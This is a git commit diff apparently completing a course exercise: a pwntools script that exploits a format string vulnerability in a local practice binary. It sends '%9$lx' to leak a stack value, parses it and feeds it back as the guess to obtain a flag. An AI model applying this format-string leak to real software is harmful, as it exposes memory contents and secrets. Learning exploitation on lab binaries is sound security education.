7f2f0d77473cbda5ddaf859dc2e4395241ddb5c6
nleobandung <142692676+nleobandung@users.noreply.github.com>
2025-11-08 02:46:45 +0000

    part 1

--- assignment-2/1-format-me/part1.py
+++ assignment-2/1-format-me/part1.py
@@ -2,21 +2,23 @@
 from pwn import *
 
 context.terminal = ['tmux', 'splitw', '-h']
-exe = ELF("./format-me-test")
+exe = ELF("./format-me")
 
 r = process([exe.path])
 # r = gdb.debug([exe.path]) # if you need to use gdb debug, please de-comment this line, and comment last line
 
+offset = 9
+
 for _ in range(10):
     # Add your code Here
-    r.recvuntil(b"xxx") # Think about what should be received first?
-    r.sendline(b"xxx") # Add your format string code here!
-    leak = r.recvline()
-    # Add your code to receive leak val here , format: val = leak[idx_1:idx_2], please think about the idx
-    val = leak[idx_1:idx_2] # you need to fill in idx_1, and idx_2 by yourself
+    r.recvuntil(b"Recipient? ")
+    r.sendline(f"%{offset}$lx".encode())
     
-    r.recvuntil(b"xxx") #Think about what should be received?
-    r.sendline(val) 
+    r.recvuntil(b"Sending to ")
+    leaked_hex = int(r.recvuntil(b"...\n")[:-4].decode(), 16)
+
+    r.recvuntil(b"Guess? ")
+    r.sendline(str(leaked_hex).encode())
     r.recvuntil(b"Correct")
 
 r.recvuntil(b"Here's your flag: ")
